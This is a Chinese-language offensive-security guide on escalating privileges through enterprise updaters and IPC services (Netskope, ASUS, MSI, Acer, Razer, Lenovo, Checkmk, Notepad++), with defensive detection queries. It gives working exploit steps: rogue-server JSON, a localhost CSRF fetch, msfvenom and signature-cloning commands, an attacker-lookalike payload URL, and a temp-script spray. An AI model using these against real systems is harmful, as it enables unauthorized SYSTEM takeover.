# 滥用企业自动更新程序和特权 IPC（例如 Netskope、ASUS 和 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类 Windows 本地权限提升链，这类问题出现在企业端点代理和更新程序中：它们暴露了易于利用的 IPC 接口，并提供特权更新流程。一个典型示例是 Netskope Client for Windows < R129（CVE-2025-0309）：低权限用户可以诱使程序向攻击者控制的服务器注册，随后发送恶意 MSI，由 SYSTEM 服务安装。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

以下关键思路可用于测试类似产品：
- 滥用特权服务的 localhost IPC，强制其重新注册或重新配置到攻击者服务器。
- 实现供应商的更新端点，发送恶意 Trusted Root CA，并将更新程序指向一个恶意的“已签名”软件包。
- 绕过薄弱的签名者检查（CN allow-lists）、可选摘要标志和宽松的 MSI 属性。
- 如果 IPC 经过“加密”，可从注册表中以全局可读方式存储的机器标识符派生密钥/IV。
- 如果 IPC 限制调用者的映像路径/进程名，可注入 allow-list 中的进程，或挂起启动此类进程，再通过最小化的线程上下文修补引导你的 DLL。

即使自定义本地 TCP 服务要求提供 PIN 或其他应用凭据，也应对其身份验证和输入边界进行同样的审查。确定监听器对应的进程及其有效服务账户，然后检查实际部署的二进制文件/版本，并确认在将调用者可控的字段复制到固定缓冲区或用于构造子进程命令之前，是否进行了长度检查。[Microsoft 的缓冲区溢出防护指南](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)解释了未经检查的外部输入为何会对特权原生代码造成危险。仅凭 loopback 监听器、硬编码凭据或进程名称，无法证明存在内存损坏或 SYSTEM 执行；可达性、授权、代码路径和缓解措施仍是各自独立的条件。常规枚举应保持被动，不要向运行中的服务发送超长输入来触发崩溃。

---
## 1) 通过 localhost IPC 强制注册到攻击者服务器

许多代理程序会附带一个用户模式 UI 进程，该进程通过 localhost TCP 使用 JSON 与 SYSTEM 服务通信。

Netskope 中观察到的情况：
- UI：stAgentUI（低完整性）↔ 服务：stAgentSvc（SYSTEM）
- IPC 命令 ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT 注册令牌，其 claims 可控制后端主机（例如 AddonUrl）。使用 alg=None，无需签名。
2) 发送调用注册命令的 IPC 消息，并附上你的 JWT 和租户名称：

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 服务开始向你的 rogue server 请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果调用方验证基于路径/名称，请从 allow-listed vendor binary 发起请求（参见 §4）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) 劫持更新通道，以 SYSTEM 身份运行代码

客户端与你的服务器通信后，实现预期的 endpoints，并引导它下载攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，将 updater 间隔设得非常短，例如：
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → 返回 PEM CA 证书。该服务会将其安装到 Local Machine Trusted Root 存储区。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的元数据。

绕过常见检查的方法：
- Signer CN allow-list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发具有该 CN 的叶证书，并用它为 MSI 签名。
- CERT_DIGEST 属性：添加一个无害的 MSI 属性 CERT_DIGEST。安装时不会强制校验。
- 可选的 digest enforcement：配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

结果：SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，以 NT AUTHORITY\SYSTEM 身份执行任意代码。<sup>[[1]](#references)[[2]](#references)</sup>

补丁绕过教训：如果供应商的应对方式是允许少量“受信任”域名，而不是通过加密方式验证更新源，请留意供应商自有的 redirector 或 reverse proxy，它们可能仍允许你控制流量。以 Netskope 为例，公开的后续研究显示，R129 时代的 allow-list 仍可通过 `rproxy.goskope.com` 滥用；该服务会代理攻击者控制的 Azure App Service 内容。应将 hostname allow-list 视为一道减速带，而非信任边界。<sup>[[14]](#references)</sup>

---
## 3) 伪造加密 IPC 请求（如果存在）

从 R127 开始，Netskope 将 IPC JSON 包装在一个看起来像 Base64 的 encryptData 字段中。逆向分析发现，它使用 AES 加密，密钥和 IV 由任何用户都能读取的注册表值派生：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密过程，并以普通用户身份发送有效的加密命令。<sup>[[1]](#references)[[2]](#references)</sup> 一般来说，如果某个 agent 突然开始“加密”其 IPC，可检查 HKLM 下的 device ID、product GUID、install ID 等值是否被用作材料。

---
## 4) 绕过 IPC 调用方 allow-list（路径/名称检查）

一些服务会尝试通过解析 TCP 连接的 PID，并将映像路径/名称与 Program Files 下 allow-list 中的供应商二进制文件（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比对，以验证对端身份。

两种实用的绕过方法：
- 将 DLL 注入 allow-list 中的进程（例如 nsdiag.exe），并从进程内部代理 IPC。
- 以挂起状态启动 allow-list 中的二进制文件，并在不使用 CreateRemoteThread 的情况下引导加载 proxy DLL（参见 §5），以满足驱动强制执行的防篡改规则。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) 兼容防篡改保护的注入：挂起进程 + NtContinue patch

产品通常会随附 minifilter/OB callbacks 驱动（例如 Stadrv），用于从指向受保护进程的句柄中移除危险权限：
- 进程：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- 线程：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一种可靠且符合这些限制的 user-mode loader：
1) 使用 CREATE_SUSPENDED 创建供应商二进制进程。
2) 获取仍被允许的句柄：进程句柄具有 PROCESS_VM_WRITE | PROCESS_VM_OPERATION 权限，线程句柄具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 权限（如果你在已知 RIP 处 patch 代码，则只需 THREAD_RESUME）。
3) 用一个小型 stub 覆盖 ntdll!NtContinue（或其他早期且保证已映射的 thunk）；该 stub 会调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) 调用 ResumeThread，在进程内部触发 stub，从而加载你的 DLL。

由于你没有对已受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（该进程是由你创建的），因此符合驱动策略。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 实用工具
- NachoVPN（Netskope 插件）可自动创建 rogue CA、为恶意 MSI 签名，并提供所需的端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope 是一个自定义 IPC 客户端，可构造任意 IPC 消息（可选 AES 加密），并包含挂起进程注入功能，以便通过 allow-list 中的二进制文件发起请求。<sup>[[4]](#references)</sup>

## 7) 未知 updater/IPC 攻击面的快速初步排查流程

面对新的 endpoint agent 或主板“助手”套件时，通常只需一个快速流程，就能判断它是否值得作为 privesc 目标进行分析：<sup>[[6]](#references)</sup>

1) 枚举 loopback 监听器，并将其关联到供应商进程：

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 枚举候选命名管道：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 挖掘插件式 IPC 服务器使用的注册表路由数据：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 先从用户态客户端提取 endpoint 名称、JSON 键和 command ID。打包后的 Electron/.NET 前端经常会 leak 完整 schema：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 查找实际的信任判定条件，而不只是最终启动进程的代码路径：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

值得优先关注的模式：
- `CryptQueryObject`/证书解析没有配合 `WinVerifyTrust`，通常意味着程序把“证书存在”当成了“证书可信”，从而可能允许克隆证书或使用其他伪造签名者的手法。
- 对 `Origin`、`Referer`、下载 URL、进程名或签名者 CN 执行子串/后缀检查并不构成身份验证。`contains(".vendor.com")` 通常可通过攻击者控制的仿冒域名利用。
- 如果低权限 GUI 判定“文件可信”，而 SYSTEM broker 只是使用这个结果，那么修补或重新实现客户端 DLL/JS 往往就能完全绕过这道边界（Razer 式分离验证）。
- 如果 broker 将 payload 复制到 `%TEMP%`/`C:\Windows\Temp`，然后从该路径验证或安排执行，请立即测试 TOCTOU 替换窗口，以及是否存在检查更宽松、提供备用 `ExecuteTask()` 包装器的同级插件模块。<sup>[[6]](#references)</sup>

对于大量使用 named pipe 的目标，PipeViewer 可以快速发现 DACL 薄弱的管道，以及可远程访问的管道，之后再深入逆向协议。<sup>[[11]](#references)</sup>

如果目标仅通过 PID、镜像路径或进程名验证调用方，应将其视为障碍，而非安全边界：注入合法客户端，或从允许列表中的进程发起连接，通常就足以通过服务器的检查。对于 named pipe，[这个介绍客户端模拟和管道滥用的页面](named-pipe-client-impersonation.md)更深入地讲解了相关原语。

对于特权 **cleanup 或 restore broker**，除了检查管道 ACL，也要检查路径信任边界。即使服务可执行文件及其安装目录受到保护，低权限调用方仍可能在共享目录中选择 restore 目标，或重命名暂存的备份文件。请分别确认调用方能否访问 restore 命令、能否修改确切的暂存输入或文件名、broker 是否以更高权限身份运行，以及其 restore 操作是否确实会写入所选的受保护路径。暂存目录可写或管道可读，本身并不能证明存在任意特权写入；需要通过代码审查或受控测试确认目标路径映射和服务行为。进行被动枚举时，不要调用未知的 cleanup 命令，因为它可能会删除用户文件。

---
## 8) 仅通过厂商签名进行身份验证的模块化 add-in broker（Lenovo Vantage 模式）

一种值得关注的新变体是 **signed-client RPC broker**：低权限的 Lenovo 签名桌面进程与 SYSTEM 服务通信，而该服务会将 JSON 命令路由到 `%ProgramData%` 下由 XML 描述的一组 add-in。一旦在任何被接受的签名客户端**内部**实现代码执行，每个 `runas="system"` 契约都会成为你的攻击面。<sup>[[15]](#references)</sup>

Lenovo Vantage 研究中观察到的高价值原语：
- **因调用方由厂商签名而信任它**：研究人员将 Lenovo 签名的 EXE 复制到可写目录，并满足 DLL side-load（`profapi.dll`）条件，从而在服务原本就信任的客户端中运行任意代码，进入了已认证上下文。
- **通过 manifest 发现攻击面**：add-in 在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下声明；若干契约以 `SYSTEM` 身份运行，因此枚举这些 manifest 往往比逆向 broker 本身更快地找到真正的特权操作。
- **已认证通道背后的单条命令漏洞**：进入受信任客户端后，公开研究发现了更新/安装操作中的路径遍历与竞态条件、特权设置数据库中的 raw-SQL 滥用，以及基于子串的注册表路径检查漏洞，这些漏洞允许在预期 hive 之外写入。

目标上的实用侦察：

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

实践要点：每当某个 helper suite 暴露一个 broker，先对 **caller process** 进行身份验证，然后才分发到数十个 plugin/add-in commands 时，不要在绕过前端信任检查后就此止步。导出 manifest/contract table，并分别 fuzz 每个高权限 verb；经过身份验证的通道通常会掩盖多个第二阶段漏洞。

---
## 1) 针对特权 HTTP API 的 Browser-to-localhost CSRF（ASUS DriverHub）

DriverHub 附带一个用户模式 HTTP 服务（ADU.exe），监听 127.0.0.1:53000，并期望浏览器请求来自 https://driverhub.asus.com。Origin 筛选器只会对 Origin header 和 `/asus/v1.0/*` 暴露的下载 URL 执行 `string_contains(".asus.com")`。因此，像 `https://driverhub.asus.com.attacker.tld` 这样的任意攻击者控制的主机都会通过检查，并能通过 JavaScript 发起更改状态的请求。<sup>[[6]](#references)</sup> 其他绕过模式请参见 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实际操作流程：
1) 注册一个包含 `.asus.com` 的域名，并在其上托管恶意网页。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的特权端点（例如 `Reboot`、`UpdateApp`）。
3) 发送 handler 所需的 JSON body——打包后的前端 JS 展示了下面的 schema。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

即使将 Origin 标头伪造为受信任值，下面展示的 PowerShell CLI 也能成功：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

因此，任何对攻击者站点的浏览器访问都会变成一次 1-click（或通过 `onload` 实现 0-click）的本地 CSRF，进而驱动一个 SYSTEM helper。

---
## 2) 不安全的代码签名验证与证书克隆（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` 会下载 JSON 请求体中指定的任意可执行文件，并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 验证使用相同的子字符串逻辑，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载后，ADU.exe 只会检查 PE 是否包含签名，以及 Subject 字符串是否与 ASUS 匹配，然后就运行它——不会调用 `WinVerifyTrust`，也不会进行证书链验证。

利用此流程的方法：
1) 创建 payload（例如，`msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的签名者克隆到 payload 中（例如，`python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 将 `pwn.exe` 托管在仿冒 `.asus.com` 的域名上，并通过上述浏览器 CSRF 触发 UpdateApp。

由于 Origin 和 URL 过滤器都基于子字符串匹配，而签名者检查只比较字符串，DriverHub 会在其提升后的上下文中下载并执行攻击者的二进制文件。<sup>[[6]](#references)</sup>

---
## 1) updater 复制/执行路径中的 TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center 的 SYSTEM 服务公开了一个 TCP 协议，每个帧的格式为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）提供 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理程序会：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（证书 Subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.”，且 `WinVerifyTrust` 必须成功）。
3) 创建一个计划任务，以 SYSTEM 身份运行临时文件，并使用攻击者控制的参数。

复制的文件在验证与 `ExecuteTask()` 之间不会被锁定。攻击者可以：
- 发送指向 MSI 正版签名二进制文件的 Frame A（确保签名检查通过并排入任务）。
- 通过重复发送指向恶意 payload 的 Frame B 与其竞速，在验证完成后立即覆盖 `MSI Center SDK.exe`。

计划任务触发时，会以 SYSTEM 身份执行被覆盖的 payload，尽管实际验证的是原始文件。可靠的利用方式是使用两个 goroutine/thread 持续发送 CMD_AutoUpdateSDK，直到抢占 TOCTOU 窗口。<sup>[[6]](#references)</sup>

---
## 2) 滥用自定义 SYSTEM 级 IPC 与 impersonation（MSI Center + Acer Control Centre）

### MSI Center TCP 命令集
- `MSI.CentralServer.exe` 加载的每个插件/DLL 都会获得一个 Component ID，该 ID 存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下。帧的前 4 个字节用于选择该组件，因此攻击者可以将命令路由到任意模块。
- 插件可以定义自己的任务运行器。`Support\API_Support.dll` 提供 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`，并在**未进行任何签名验证**的情况下直接调用 `API_Support.EX_Task::ExecuteTask()`——任何本地用户都可以指定 `C:\Users\<user>\Desktop\payload.exe`，从而稳定地获得 SYSTEM 执行权限。
- 使用 Wireshark 嗅探 loopback 流量，或在 dnSpy 中分析 .NET 二进制文件，即可快速找出 Component 与 command 的映射；之后可以使用自定义 Go/Python 客户端重放帧。<sup>[[6]](#references)</sup>

### Acer Control Centre 命名管道与 impersonation level
- `ACCSvc.exe`（SYSTEM）公开了 `\\.\pipe\treadstone_service_LightMode`，其自主访问控制列表允许远程客户端访问（例如 `\\TARGET\pipe\treadstone_service_LightMode`）。发送带有文件路径的命令 ID `7` 会调用该服务的进程启动例程。
- 客户端库会将一个 magic terminator byte（113）与参数一起序列化。通过 Frida/`TsDotNetLib` 进行动态插桩（插桩技巧参见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）后可以发现，原生处理程序会在调用 `CreateProcessAsUser` 前，将此值映射到一个 `SECURITY_IMPERSONATION_LEVEL` 和 integrity SID。
- 将 113（`0x71`）替换为 114（`0x72`），会进入通用分支；该分支保留完整的 SYSTEM token，并设置高完整性 SID（`S-1-16-12288`）。因此，启动的二进制文件会以不受限制的 SYSTEM 身份运行，无论是在本地还是跨机器。
- 再结合公开的安装程序标志（`Setup.exe -nocheck`），即可在实验室 VM 上安装 ACC，并在没有厂商硬件的情况下测试该管道。<sup>[[6]](#references)</sup>

这些 IPC 漏洞说明了为什么 localhost 服务必须实施双向身份验证（ALPC SIDs、`ImpersonationLevel=Impersonation` 过滤器、token filtering），也说明了为什么每个模块的“运行任意二进制文件” helper 都必须采用相同的签名验证。

---
## 3) 由薄弱的用户态验证支持的 COM/IPC “elevator” helper（Razer Synapse 4）

Razer Synapse 4 为这一类漏洞提供了另一个有用的模式：低权限用户可以请求 COM helper 通过 `RzUtility.Elevator` 启动进程，而信任判断被委托给用户态 DLL（`simple_service.dll`），而不是在特权边界内得到可靠执行。

观察到的利用路径：
- 实例化 COM 对象 `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)` 请求提升权限启动。
- 在公开的 PoC 中，发出请求前会修补掉 `simple_service.dll` 内的 PE 签名检查，从而允许启动攻击者任意选择的可执行文件。<sup>[[6]](#references)[[10]](#references)</sup>

最简 PowerShell 调用：

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

总体要点：逆向分析“helper”套件时，不要只检查 localhost TCP 或 named pipes。检查是否存在名称类似 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM classes，然后确认特权服务是否确实会自行验证目标 binary，还是仅仅信任由可被 patch 的 user-mode client DLL 计算出的结果。这种模式并不只见于 Razer：任何高权限 broker 接收来自低权限端的 allow/deny 决策的拆分式设计，都可能构成 privesc 攻击面。


---
## MSI 修复期间执行可预测的临时脚本 (Checkmk Agent / CVE-2024-0670)

某些 Windows agents 仍会通过在 `C:\Windows\Temp` 中写入临时 `.cmd`，再以 `SYSTEM` 身份执行，来实现特权操作。如果文件名可预测，且服务无法安全地重新创建已有文件，低权限用户就可以预先创建未来的临时文件并将其设为**只读**，从而让特权进程执行攻击者控制的内容，而不是它自己的脚本。

在存在漏洞的 Checkmk Agent 版本中观察到：
- 临时文件模式：`cmk_all_<PID>_1.cmd`
- 受影响分支：`2.0.0`、`2.1.0`、`2.2.0`
- 触发方式：修复缓存的 agent package<sup>[[8]](#references)[[9]](#references)</sup>

实用流程：
1. 根据当前进程 ID 或正在运行的 agent PID，估算合理的 PID 范围。
2. 编写简短的 **ASCII** `.cmd` payload（使用 `Set-Content -Encoding Ascii` 或 `cmd.exe` 重定向；避免用 PowerShell 输出 UTF-16 格式的批处理文件）。
3. 在候选范围内向 `C:\Windows\Temp\cmk_all_<PID>_1.cmd` 执行 spray，并将每个文件标记为只读。
4. 触发对缓存 MSI 的修复，使特权服务尝试重新生成并执行临时脚本。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

如果易受攻击的产品是通过 Windows Installer 安装的，请先将 `C:\Windows\Installer` 下看似随机命名的缓存 MSI 映射回其产品名称，然后再触发修复：<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

操作说明：
- 当 `msiexec /fa` 在非交互式 WinRM shell 中失败，且你需要判断现有桌面会话或断开连接的会话是否能正确触发修复时，`qwinsta` 很有用。<sup>[[7]](#references)</sup>
- 这一模式也适用于其他端点代理和更新程序：它们会**将临时脚本放在所有用户均可写的位置，随后以 SYSTEM 身份执行**。检查名称是否可预测、是否缺少排他创建语义，以及能否按需触发修复/更新流程。

### 交互式安装程序修复与特权控制台

PDF24 Creator 11.15.1 展示了另一种 MSI 修复风险：修复期间，其打印机安装自定义操作可能会以 SYSTEM 权限启动一个可见控制台。供应商在 11.15.2 中更改了 MSI 安装程序以解决此问题。旧版产品只能作为初步排查线索。检查已注册或可访问的 MSI 包、此用户是否能发起修复、是否存在存在漏洞的自定义操作和日志文件延迟，以及交互式桌面是否会显示该控制台。报告中的延迟通过对 `faxPrnInst.log` 使用 oplock 实现；普通的文件可写权限并非唯一访问条件。非交互式 shell、无法访问安装包或已修补的安装程序都可能中断攻击链。此问题不依赖 `AlwaysInstallElevated`，并且不同于替换可预测的临时脚本。

---
## 通过较弱的更新程序验证实施远程供应链劫持（WinGUp / Notepad++）

2025 年 6 月至 2025 年 12 月期间，攻击者攻破了 Notepad++ 更新流程背后的托管基础设施，并有选择地向特定受害者提供恶意清单。较旧的基于 WinGUp 的更新程序未能充分验证更新真实性，因此恶意 XML 响应可将客户端重定向到攻击者控制的 URL。由于客户端接受 HTTPS 内容，却未强制验证可信证书链和下载的安装程序是否具有有效 PE 签名，受害者因此下载并执行了木马化的 NSIS `update.exe`。<sup>[[12]](#references)[[13]](#references)</sup>

操作流程（无需本地漏洞利用）：
1. **拦截基础设施**：攻破 CDN/托管服务，并在响应更新检查时返回指向恶意下载 URL 的攻击者元数据。
2. **木马化 NSIS**：安装程序下载/执行 payload，并滥用两条执行链：
   - **自带签名二进制文件 + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并将恶意 `log.dll` 放入其搜索路径。运行该已签名二进制文件时，Windows 会 sideload `log.dll`，后者解密并以反射方式加载 Chrysalis 后门（使用 Warbird 保护和 API hashing 来阻碍静态检测）。
   - **脚本化 shellcode 注入**：NSIS 执行编译后的 Lua 脚本，使用 Win32 API（例如 `EnumWindowStationsW`）注入 shellcode 并部署 Cobalt Strike Beacon。<sup>[[12]](#references)</sup>

适用于任何自动更新程序的加固/检测要点：
- 强制对下载的安装程序执行**证书和签名验证**（固定供应商签名者，拒绝不匹配的 CN/证书链），并对更新清单本身签名（例如使用 XMLDSig）。除非经过验证，否则阻止由清单控制的重定向。
- 将**自带签名二进制文件 sideload** 视为下载后的检测切入点：当已签名的供应商 EXE 从其规范安装路径以外的位置加载 DLL（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），以及当更新程序从临时目录写入/执行非供应商签名的安装程序时，触发告警。
- 监控此攻击链中观察到的**恶意软件特定痕迹**（可作为通用排查线索）：互斥体 `Global\Jdhfv_1.0.1`、`gup.exe` 异常写入 `%TEMP%`，以及由 Lua 驱动的 shellcode 注入阶段。
- Notepad++ 从 v8.8.9 起加强了 WinGUp：现在返回的 XML 会经过签名（XMLDSig），较新的版本也会强制验证下载的安装程序的证书和签名，而不再仅信任传输过程。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 签名 EXE sideloading <code>log.dll</code>（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

这些模式可推广到任何接受未签名 manifest 或未能固定 installer 签名者的 updater——网络劫持 + 恶意 installer + BYO-signed sideloading，可在“可信”更新的幌子下实现 remote code execution。

---
## References
- [1] [公告 – Windows 版 Netskope Client – 通过 Rogue Server 本地提权 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 安全公告 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope 插件](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – 攻破 ASUS DriverHub、MSI Center、Acer Control Centre 和 Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – 通过 Checkmk Agent 中可写文件实现本地提权](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent 中的提权漏洞](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家级攻击者利用 Notepad++ 供应链](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 基础设施遭劫持事件更新](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – 绕过 Windows 版 Netskope Client 的 CVE-2025-0309 修复](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – 揭示 Lenovo Vantage 中的提权漏洞](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
